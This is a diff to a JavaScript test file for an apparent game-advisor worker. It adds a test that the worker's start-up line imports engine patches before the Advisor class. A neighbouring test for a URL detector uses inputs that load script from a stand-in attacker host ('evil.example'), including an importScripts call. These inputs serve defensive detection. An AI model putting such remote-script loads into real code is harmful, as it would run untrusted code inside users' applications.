@@ -174,6 +174,19 @@ test("the published worker sends an opponent's move with a read to engine/, and 
   assert.ok(at("adv.play(st, pl['seat']") < at("except Cancelled:"));
 });
 
+test("the published worker imports Lizard's engine patches at start, before the Advisor it patches", () => {
+  const worker = editWorker(upstream);
+  const line = worker.split("\n").find((l) => l.includes("from gto.advisor import Advisor;"));
+  assert.ok(line, "no Advisor import");
+  const at = (s) => {
+    assert.ok(line.includes(s), `the start-up line has no ${s}`);
+    return line.indexOf(s);
+  };
+  assert.ok(at("sys.path.insert(0, '/app');") < at("import engine.pf_stored;"));
+  assert.ok(at("import engine.pf_stored;") < at("import engine.tree_depth;"));
+  assert.ok(at("import engine.tree_depth;") < at("from gto.advisor import Advisor;"));
+});
+
 test("hostsNamed sees URLs in comments and strings, and leaves the worker's own paths alone", () => {
   assert.deepEqual(hostsNamed("// from https://evil.example/x.js\n"), ["https://evil.example/x.js"]);
   assert.deepEqual(hostsNamed('importScripts("//evil.example/x.js")'), ["//evil.example/"]);
